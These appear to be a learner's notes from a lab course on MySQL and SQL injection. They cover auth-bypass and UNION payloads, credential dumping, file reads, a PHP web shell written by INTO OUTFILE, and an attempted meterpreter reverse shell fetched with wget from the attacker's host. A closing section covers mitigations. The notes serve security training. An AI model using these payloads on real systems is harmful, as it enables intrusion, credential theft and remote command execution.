
## MySQL

#### Intro to MySQL
```
## Command Line
areaeric@htb[/htb]$ mysql -u root -p

areaeric@htb[/htb]$ mysql -u root -p<password>

Tip: There shouldn't be any spaces between '-p' and the password.

areaeric@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 

Note: The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.

Note: To follow along with the examples, try to use the 'mysql' tool on your PwnBox to log in to the DBMS found in the question at the end of the section, using its IP and port. Use 'root' for the username and 'password' for the password.

## Creating a database
mysql> CREATE DATABASE users;

mysql> SHOW DATABASES;
mysql> USE users;

SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.

## Tables
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

mysql> SHOW TABLES;

mysql> DESCRIBE logins;

id INT NOT NULL AUTO_INCREMENT,

username VARCHAR(100) UNIQUE NOT NULL,

date_of_joining DATETIME DEFAULT NOW(),

PRIMARY KEY (id)

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
Note: Allow 10-15 seconds for the servers in the questions to start, to allow enough time for Apache/MySQL to initiate and run.

## Questions
mysql -u root -h 94.237.63.83 -P 54848 -ppassword
SHOW DATABASES;
```

#### SQL Statements
```
## INSERT Statement
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);

mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);

Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.

mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

Note: The examples insert cleartext passwords into the table, for demonstration only. This is a bad practice, as passwords should always be hashed/encrypted before storage.

mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

## SELECT Statement
SELECT * FROM table_name;

SELECT column1, column2 FROM table_name;

mysql> SELECT * FROM logins;
mysql> SELECT username,password FROM logins;

## DROP Statement
mysql> DROP TABLE logins;
mysql> SHOW TABLES;

The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

## ALTER Statement
mysql> ALTER TABLE logins ADD newColumn INT;

mysql> ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;

mysql> ALTER TABLE logins MODIFY oldColumn DATE;

mysql> ALTER TABLE logins DROP oldColumn;

## UPDATE Statement
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;

mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
mysql> SELECT * FROM logins;

Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.

## Questions
mysql -u root -h 94.237.63.83 -P 54848 -ppassword
SHOW DATABASES;

USE employees;

SHOW tables;
-> Find interesting tables, including  departments, dept_emp, dept_emp_latest_date, dept_manager  

- Attempting to describe department table:
DESCRIBE departments;
-> dept_no and dept_name

- using select statement:
SELECT dept_no FROM departments WHERE dept_name="Development";
```

#### Query Results
```
## Sorting Results
mysql> SELECT * FROM logins ORDER BY password;

mysql> SELECT * FROM logins ORDER BY password DESC;

mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

## LIMIT results
mysql> SELECT * FROM logins LIMIT 2;

mysql> SELECT * FROM logins LIMIT 1, 2;

Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

## WHERE Clause
SELECT * FROM table_name WHERE <condition>;

mysql> SELECT * FROM logins WHERE id > 1;

mysql> SELECT * FROM logins where username = 'admin';

Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

## LIKE Clause
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

mysql> SELECT * FROM logins WHERE username like '___';

## Questions
mysql -u root -h 94.237.63.83 -P 54848 -ppassword
SHOW DATABASES;

USE employees;

SHOW tables;

- Seems like its the employee table:
DESCRIBE employees;

- Attempt to query from employees
SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```

#### SQL Operator
```
## AND Operator
condition1 AND condition2

mysql> SELECT 1 = 1 AND 'test' = 'test';
mysql> SELECT 1 = 1 AND 'test' = 'abc';

## OR Operator
mysql> SELECT 1 = 1 OR 'test' = 'abc';
mysql> SELECT 1 = 2 OR 'test' = 'abc';

## NOT Operator
mysql> SELECT NOT 1 = 1;
mysql> SELECT NOT 1 = 2;

## Symbol Operator
mysql> SELECT 1 = 1 && 'test' = 'abc';
mysql> SELECT 1 = 1 || 'test' = 'abc';
mysql> SELECT 1 != 1;

## Operators in queries
mysql> SELECT * FROM logins WHERE username != 'john';

mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;

## Multiple Operator Precedence
-> Order of operator (higher up -> evaluated firsts)
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;

SELECT * FROM logins WHERE username != 'tom' AND id > 1;
-> Not tom and id > 1

mysql> select * from logins where username != 'tom' AND id > 3 - 2;

## Questions
- Login to database, use the employee table.

DESCRIBE titles;
-> emp_no, title, from_date, to_date columns

- Attempt on query construction:
SELECT COUNT(*) FROM titles WHERE emp_no > 10000 || title NOT LIKE 'engineer';

-> Looked up COUNT() operator on google. 
```

## SQL Injections
#### Intro to SQL Injections
```
## Use of SQL in Web Applications
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);

while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}

$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

## SQL Injection
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

select * from logins where username like '%$searchInput'

- Input: 1'; DROP TABLE users;' becomes
'%1'; DROP TABLE users;'

Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').

- SQL query executed:
select * from logins where username like '%1'; DROP TABLE users;'

Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.

## Syntax Errors
Error: near line 1: near "'": syntax error

select * from logins where username like '%1'; DROP TABLE users;'
```

#### Subverting Query Logic
```
## Authentication Bypass
- Find an admin login page

- Attempt to login with `admin / p@ssw0rd`.

SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

## SQLi Discovery
- Test whether vulnerable through injecting payload and observe its behaviour

- Encode some payload:
|Payload|URL Encoded|
|---|---|
|'|`%27`|
|"|`%22`|
|#|`%23`|
|;|`%3B`|
|)|`%29`|
|`|`%60`|

-!!!Extra note: Using Burp Intruder on username field for custom username payload for automatic SQL injection (workflow)
	Exception: For some injection that uses SQLMAP, there is an exception of reserved character for some parameter (SQLMAP essentials task 6), so need to be aware of whether the parameter we are dealing witth is reserved key word or not. 

-!!! We will have to adjust the payload of all things and adjust it accordingly (change ' to ` character for injection)

-!!! note on Union injections and non-automated discovered injection.
-> We need to reverse engineer/think from the developer's perspective what the SQL query would be, then make educated attack accordingly. 

- General idea is: SQLi discovery -> reverse engineer think about query for sqli discovery. 

Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.


- Start by injecting a single quote:

SELECT * FROM logins WHERE username=''' AND password = 'something';

## OR Injection
- Inject: admin' or '1'='1

- Query result: SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
	-> or is always evaluated last, and so by construction it will always be true.

Note: The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

- Payload list https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

## Auth Bypass with OR operator
- Inject: admin' or '1'='1
	-> Login success

- Inject a different unknown username: Inject: notadmin' or '1'='1
	-> Overall query not true. 

- Inject samething but for password: something' or '1'='1
	-> Login success

- Inject the ' or '1' = '1 for password field. 
	-> Login success

## Questions
- Use Tom' or '1'='1 payload on user field.
```

#### Using Comments
```
## Comments
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.

mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

## Auth Bypass with comments
- Inject admin'-- as username:
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
-> Login success

## Another example
- Logging in with `admin / p@ssw0rd`
-> Login failed, despite valid credentials

- Logging in as `tom`
-> Log in success

- Logging in with admin'--
-> Log in failed, failed to add a closing parenthesis

- Logging in with admin')--
-> Log in success:
Final result of query:
SELECT * FROM logins where (username='admin')

## Questions
-> Injected a ' in username 
-> error

SELECT * FROM logins WHERE (username='' or '1='1' AND id > 1) AND password = '21232f297a57a5a743894a0e4a801fc3';

what i want: username='' or id = 5) -- -'

username='
' or id = 5) -- -'

Inject ' or id = 5) -- -'
```

#### Union Clause
```
## Union
mysql> SELECT * FROM ports;

mysql> SELECT * FROM ships;

mysql> SELECT * FROM ports UNION SELECT * FROM ships;

Note: The data types of the selected columns on all positions should be the same.

## Even Columns
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns

SELECT * FROM products WHERE product_id = 'user_input'

- SQL union injection on the above query:
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

## Un-even Columns
Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

- Only getting username column
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords

- On selecting tables with 4 columns:
UNION SELECT username, 2, 3, 4 from passwords-- '

- Return result:
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+

## Questions
mysql -u root -h 94.237.56.188 -P 37647 -ppassword
SHOW DATABASES;

USE employees;

SHOW tables;

- Look at columns in employees and departments table
DESCRIBE employees; -> 6 columns
DESCRIBE departments; -> 2 columns

## Even columns:
SELECT emp_no, birth_date from employees UNION SELECT dept_no, dept_name from departments;

-> using google search result for union count:
SELECT COUNT(*) FROM (
SELECT emp_no, birth_date from employees UNION SELECT dept_no, dept_name from departments) X;
-> X stands for some random variable

## Uneven columns
SELECT COUNT(*) FROM (
SELECT * from employees UNION SELECT dept_no, dept_name, 3, 4, 5, 6 from departments) X;
```

#### Union Injection
```
## Injection detection
- Saw a searching page (port searching)

- Apply SQLi Discovery steps by injecting '
-> Received error, page is vulnerable to SQL injection.

## Detect number of columns
- Inject  from ' order by 1-- -  to order by x until i fails.
- Failing at `order by 4` means there is 3 columns.

Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).

' order by 2-- -

' order by 5-- -
-> Fails, this table has 4 columns

- Union based method gives error failure attempt until success.
cn' UNION select 1,2,3-- -

cn' UNION select 1,2,3,4-- -
-> Success, has 4 columns

## Location of injection
- Not all selected results gets printed on the page.

cn' UNION select 1,@@version,3,4-- -

## Questionos
- Directly follow from section
cn' UNION select 1,user(),3,4-- -
```

## Exploitation
#### Database Enumeration
```
## MySQL Fingerprinting
- Use the following payload that would work on MySQL but not other databases:
SELECT @@version
SELECT POW(1,1)
SELECT SLEEP(5)
- Note remove the SELECT when injecting into the payload, i.e. just input @@version, POW(1,1) and SLEEP(5)

## INFORMATION_SCHEMA Database
- E.g. For querying table users in database named my_database
SELECT * FROM my_database.users;

## SCHEMATA
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

cn' UNION select 1,database(),2,3-- -

## Tables
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.

Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.

## COLUMNS
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

## Data
cn' UNION select 1, username, password, 4 from dev.credentials-- -

Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.

## Exercises
- Directly from section:
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
-> ilfreight, dev

cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
-> ports, users, products

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
-> USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password

cn' UNION select 1, username, password, 4 from ilfreight.users WHERE username = 'newuser' -- -
```

#### Reading Files
```
## Privileges
- SQL query:
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

cn' UNION SELECT 1, user(), 3, 4-- -
or
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

- SQL query:
SELECT super_priv FROM mysql.user

- Payload:
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

## LOAD_FILE
- SQL query:
SELECT LOAD_FILE('/etc/passwd');

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

- Payload:
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

## Another Example
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

## Questions:
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
-> Examine source code:
- See include "config.php"

-> Check "config.php"
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

#### Writing Files
```
## Write File Privileges
To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

-> Generally we can only check first two, the third one is more of a we check on the way through error message and see if we access it after writing the file.

- SQl query:
SHOW VARIABLES LIKE 'secure_file_priv';

SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

- Payload:
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

## SELECT INTO OUTFILE
- SQL query:
SELECT * from users INTO OUTFILE '/tmp/credentials';

areaeric@htb[/htb]$ cat /tmp/credentials 

- SQL query
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

areaeric@htb[/htb]$ cat /tmp/test.txt 

areaeric@htb[/htb]$ ls -la /tmp/test.txt 

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection
- SQL query:
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

- Payload:
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

## Writing a Web Shell
- PHP web shell:
<?php system($_REQUEST[0]); ?>

- Payload:
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

## Questions
- Follow directly fromm section:
- Access the page:
http://83.136.253.251:36720/shell.php?0=id

find the flag:
http://83.136.253.251:36720/shell.php?0=find / -type f -name "flag.txt" 2>/dev/null
-> /var/www/flag.txt

http://83.136.253.251:36720/shell.php?0=cat /var/www/flag.txt
```

## Mitigations
#### Mitigating SQL Injection
```
## Overview
- We have learned about SQL injections, why they occur, and how we can exploit them. 
 
	-> We should also learn how to avoid these types of vulnerabilities in our code and patch them when found. 
	
	-> Let's look at some examples of how SQL Injection can be mitigated.

## Input Sanitization

- Here's the snippet of the code from the authentication bypass section we discussed earlier:

Code: php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>

- As we can see, the script takes in the `username` and `password` from the POST request and passes it to the query directly. 
 
	-> This will let an attacker inject anything they wish and exploit the application. 
	
	-> Injection can be avoided by sanitizing any user input, rendering injected queries useless. 
	
	-> Libraries provide multiple functions to achieve this, one such example is the [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php) function. 
	
	-> This function escapes characters such as `'` and `"`, so they don't hold any special meaning.

Code: php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>

## Input Validation
- User input can also be validated based on the data used to query to ensure that it matches the expected input. 
 
	-> For example, when taking an email as input, we can validate that the input is in the form of `...@email.com`, and so on.

	-> Consider the following code snippet from the ports page, which we used `UNION` injections on:

<?php
if (isset($_GET["port_code"])) {
	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
	$result = pg_query($conn,$q);
    
	if (!$result)
	{
   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
	}
<SNIP>
?>

- We see the GET parameter `port_code` being used in the query directly. 
 
	-> It's already known that a port code consists only of letters or spaces. 
	
	-> We can restrict the user input to only these characters, which will prevent the injection of queries.
	
	 -> A regular expression can be used for validating the input:

<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>

## User Privileges

- As discussed initially, DBMS software allows the creation of users with fine-grained permissions. 
 
	-> We should ensure that the user querying the database only has minimum permissions.

- Superusers and users with administrative privileges should never be used with web applications.
 
	-> These accounts have access to functions and features, which could lead to server compromise.

MariaDB [(none)]> CREATE USER 'reader'@'localhost';

Query OK, 0 rows affected (0.002 sec)


MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Query OK, 0 rows affected (0.000 sec)

- The commands above add a new MariaDB user named `reader` who is granted only `SELECT` privileges on the `ports` table. 
 
	-> We can verify the permissions for this user by logging in:

areaeric@htb[/htb]$ mysql -u reader -p

MariaDB [(none)]> use ilfreight;
MariaDB [ilfreight]> SHOW TABLES;

+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)


MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)


MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'

- The snippet above confirms that the `reader` user cannot query other tables in the `ilfreight` database. 
 
	-> The user only has access to the `ports` table that is needed by the application.

## Web Application Firewall

- Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. 
 
	-> This helps in preventing SQL Injection even when the application logic is flawed. 
	
	-> WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. -
	
	-> For example, any request containing the string `INFORMATION_SCHEMA` would be rejected, as it's commonly used while exploiting SQL injection.

## Parameterized Queries

- Another way to ensure that the input is safely sanitized is by using parameterized queries.

	-> Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers.
	
	 -> Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.

	-> Consider the following modified code:

<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>


## Conclusion

- The list above is not exhaustive, and it could still be possible to exploit SQL injection based on the application logic. 
 
	- >The code examples shown are based on PHP, but the logic applies across all common languages and libraries.
```

The query is modified to contain two placeholders, marked with `?` where the username and password will be placed. We then bind the username and password to the query using the [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php) function. This will safely escape any quotes and place the values in the query.
```

The code is modified to use the [preg_match()](https://www.php.net/manual/en/function.preg-match.php) function, which checks if the input matches the given pattern or not. The pattern used is `[A-Za-z\s]+`, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.
```


```

As we can see, the script takes in the `username` and `password` from the POST request and passes it to the query directly. This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php) function. This function escapes characters such as `'` and `"`, so they don't hold any special meaning.
```



## Skills assessment
```
The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

- Used worked flow (SQLi injection discovery + username intruder technique) to bypass authentication:
Payload used is:
	admin' or '1'='1'#
on username field

- Performing injection detection on search field:
	-> Vulnerable to SQLi injection on '
- Detecting number of columns
	-> ' order by 6-- -  failed, have 5 columns

- Testing columns being displayed and footprinting
cn' UNION select 1,@@version,3,4,5-- -
	-> only column 2,3,4,5 are being displayed,
	-> DB version is 10.3.22-MariaDB-1ubuntu1

- Database Enumeration:
## Schemata
cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
-> ilfreight and backup database
-> proceed with looking at backup database

## Tables
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -
-> admin_bk

## COLUMNS
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='admin_bk'-- -
-> username, password

## Data
cn' UNION select 1, username, password, 4, 5 from backup.admin_bk -- -
-> Obtain credentials, admin:Inl@n3_fre1gh7_adm!n

Similarly with ilfreight database:

## Tables
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
-> users, payement
-> proceed with users table examiniation

## COLUMNS
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
-> username, password, id, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS

## Data
cn' UNION select 1, username, password, 4, 5 from ilfreight.users -- -
-> Obtain credentials, adam:1be9f5d3a82847b8acca40544f953515

- Checking user of the database:
cn' UNION select 1,user(),3,4,5-- -
-> we are root, might be able to write files. 

- Reading files
cn' UNION SELECT 1, user, 3, 4, 5 from mysql.user-- -
-> we are root

cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -
-> Y

cn' UNION SELECT 1, grantee, privilege_type, 4,5 FROM information_schema.user_privileges-- -
-> Have FILE privilege

- Checking for write privilege
cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
-> empty, we can write

- try writing webshell
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
-> error, trying writing in dashboard directory:
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -

- verify our payload is on the page:
http://94.237.54.170:44255/dashboard/shell.php?0=id
-> uid=33(www-data) gid=33(www-data) groups=33(www-data)

-- Start of rabbit hole:
---
%% - Looking for flag:
http://94.237.54.170:44255/dashboard/shell.php?0=find / -type f -name "flag.txt" 2>/dev/null

-> do no have enough permission. 

check if we can access MySQL

sudo nmap 94.237.54.170 -p 3306
- We have credentials so we can try logging in to SQL server directly. 
-> failed

- Reading source code file
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3, 4, 5-- -
	-> Have config.php that seems interesting

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboardconfig.php"), 3, 4, 5-- -
-> nothing appeared, tried a directory lower:
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4, 5-- -

'127.0.0.1', 'DB_USERNAME' => 'root', 'DB_PASSWORD' => 'password', 'DB_DATABASE' => 'ilfreight' ); $conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']); if (mysqli_connect_errno($conn)) { echo "Failed connecting. " . mysqli_connect_error() . "  
"; } ?>

- Create a reverse shell:

our side:
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f elf > createbackup.elf

use multi/handler
set payload linux/x64/meterpreter_reverse_tcp 

python -m http.server

target side:
http://94.237.54.170:44255/dashboard/shell.php?0=wget http://10.10.16.12:8000/createbackup.elf
-> not working.

back to file reading. 

- attempt to read file
cn' UNION SELECT 1, LOAD_FILE("/root/flag.txt"), 3, 4, 5-- - %%
-----
-- End of rabbit hole


- Turns out I already have flag, just misinterpreted the queston lol

http://94.237.54.170:44255/dashboard/shell.php?0=ls%20/
-> flag_cae1dadcd174.txt

http://94.237.54.170:44255/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt


```